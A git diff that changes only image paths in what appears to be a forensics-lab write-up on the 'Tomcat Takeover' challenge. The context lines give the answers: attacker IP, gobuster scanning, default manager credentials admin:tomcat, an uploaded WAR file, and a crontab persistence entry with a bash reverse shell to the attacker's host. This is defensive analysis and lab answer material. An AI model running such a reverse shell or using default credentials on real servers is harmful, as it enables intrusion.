@@ -49,9 +49,9 @@ tcp.flags.syn == 1 && tcp.flags.ack == 0
 ```
 14.0.0.120
 ```
-![Answer](../images/Tomcat-Takeover-1.png)
+![Answer](../imgs/Tomcat-Takeover-1.png)
 
-![Answer](../images/Tomcat-Takeover-2.png)
+![Answer](../imgs/Tomcat-Takeover-2.png)
 
 ---
 
@@ -72,7 +72,7 @@ Submitted `14.0.0.120` to an external IP geolocation service (VirusTotal / ipinf
 ```
 China
 ```
-![Answer](../images/Tomcat-Takeover-3.png)
+![Answer](../imgs/Tomcat-Takeover-3.png)
 
 ---
 
@@ -99,7 +99,7 @@ Server: Apache-Coyote/1.1
 ```
 8080
 ```
-![Answer](../images/Tomcat-Takeover-4.png)
+![Answer](../imgs/Tomcat-Takeover-4.png)
 
 ---
 
@@ -126,7 +126,7 @@ User-Agent: gobuster/3.6
 ```
 gobuster
 ```
-![Answer](../images/Tomcat-Takeover-5.png)
+![Answer](../imgs/Tomcat-Takeover-5.png)
 
 ---
 
@@ -152,7 +152,7 @@ Among Gobuster's successful hits, the Tomcat Manager application path was discov
 ```
 /manager
 ```
-![Answer](../images/Tomcat-Takeover-6.png)
+![Answer](../imgs/Tomcat-Takeover-6.png)
 
 ---
 
@@ -185,7 +185,7 @@ These are the **default Apache Tomcat credentials** — never changed after depl
 ```
 admin:tomcat
 ```
-![Answer](../images/Tomcat-Takeover-7.png)
+![Answer](../imgs/Tomcat-Takeover-7.png)
 
 ---
 
@@ -213,7 +213,7 @@ A `.war` (Web Application Archive) file is a packaged Java web application. By d
 ```
 JXQOZY.war
 ```
-![Answer](../images/Tomcat-Takeover-8.png)
+![Answer](../imgs/Tomcat-Takeover-8.png)
 
 ---
 
@@ -251,7 +251,7 @@ The crontab entry injected:
 ```
 /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'
 ```
-![Answer](../images/Tomcat-Takeover-9.png)
+![Answer](../imgs/Tomcat-Takeover-9.png)
 
 ---
 
